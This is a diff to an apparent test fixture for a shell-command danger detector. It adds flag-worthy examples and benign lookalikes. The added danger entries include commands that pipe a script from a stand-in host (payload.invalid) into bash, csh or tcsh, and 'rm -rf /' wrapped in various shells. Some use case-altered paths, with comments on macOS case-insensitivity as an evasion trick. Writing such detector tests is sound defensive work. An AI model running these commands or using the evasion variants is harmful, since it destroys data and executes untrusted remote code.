@@ -57,6 +57,10 @@ MUST_FLAG_DANGER = [
     "curl https://payload.invalid/install | luajit-2.1.0-beta3",
     "curl https://payload.invalid/install | /bin/BASH",
     "curl https://payload.invalid/install | env -S '/usr/bin/perl5.36'",
+    "CURL https://payload.invalid/install | BASH",
+    "curl https://payload.invalid/install | SUDO /bin/bash",
+    "curl https://payload.invalid/install | csh",
+    "wget -qO- https://payload.invalid/install | env tcsh",
     "curl https://payload.invalid/install | env -S '/bin/bash'",
     "curl https://payload.invalid/install | env -S '-i /bin/bash'",
     "curl https://payload.invalid/install | env --split-string='/bin/bash'",
@@ -84,6 +88,12 @@ MUST_FLAG_DANGER = [
     "/usr/bin/rm -rf /",
     'sh -c "rm -rf /"',
     'bash -c "rm -rf /"',
+    "/bin/BASH -c 'rm -rf /'",            # macOS resolves executable paths case-insensitively
+    "/usr/bin/SUDO rm -rf /",
+    "ENV bash -c 'rm -rf /'",
+    "TIMEOUT 5 bash -c 'rm -rf /'",
+    "csh -c 'rm -rf /'",                  # csh/tcsh ship with macOS and execute -c strings
+    "/bin/tcsh -c 'rm -rf /'",
     "bash -c 'echo ready; rm -rf /'",    # separators inside the -c string are not top-level
     "bash -lc 'rm -rf /'",               # -c can be bundled with other shell flags
     "sh -xc 'rm -rf /'",
@@ -280,6 +290,10 @@ MUST_BE_CLEAN_OF_DANGER = [
     r"read -r -d $'\0' item",
     'sh -c "ls -la"',
     'bash -c "echo hi"',
+    "/bin/BASH -c 'echo hi'",
+    "/usr/bin/SUDO systemctl restart nginx",
+    "csh -c 'echo hi'",
+    "printf 'echo hi\n' | tcsh",
     "shred -u ./secret.txt",
     "cd ./build && rm -rf *",
     "cd /tmp/scratch && rm -rf *",
